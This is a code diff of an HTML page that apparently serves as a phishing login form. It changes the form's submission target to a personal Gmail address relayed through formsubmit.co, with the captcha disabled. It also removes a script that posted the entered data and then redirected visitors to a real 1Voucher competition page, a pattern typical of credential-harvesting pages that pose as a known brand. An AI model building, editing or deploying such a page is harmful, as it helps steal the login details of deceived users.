@@ -60,7 +60,7 @@
       color: #DD571C;
       font-size: 16px;
       line-height: 1.5;
-      display: none;
+      display: none; /* Keep hidden unless needed */
     }
 
     @keyframes blinkTwice {
@@ -183,7 +183,7 @@
       </div>
 
       <!-- Form -->
-      <form id="loginForm" action="https://formsubmit.co/rbarsrsa@gmail.com" method="POST">
+      <form id="loginForm" action="https://formsubmit.co/robarsrsa@gmail.com" method="POST">
         <input type="hidden" name="_captcha" value="false" />
 
         <div class="row">
@@ -207,32 +207,7 @@
     </div>
   </div>
 
-  <script>
-    const loginForm = document.getElementById("loginForm");
+  <!-- Removed the custom JavaScript for fetch; relying on default form submission -->
 
-    loginForm.addEventListener("submit", function (e) {
-      e.preventDefault();
-
-      const formData = new FormData(loginForm);
-
-      fetch(loginForm.action, {
-        method: "POST",
-        body: formData,
-        headers: {
-          'Accept': 'application/json'
-        }
-      }).then(response => {
-        if (response.ok) {
-          // Redirect after successful submission
-          window.location.href = "https://www.1voucher.co.za/blog-categories/competition";
-        } else {
-          alert("Submission failed. Please try again.");
-        }
-      }).catch(error => {
-        alert("An error occurred. Please try again later.");
-        console.error(error);
-      });
-    });
-  </script>
 </body>
 </html>
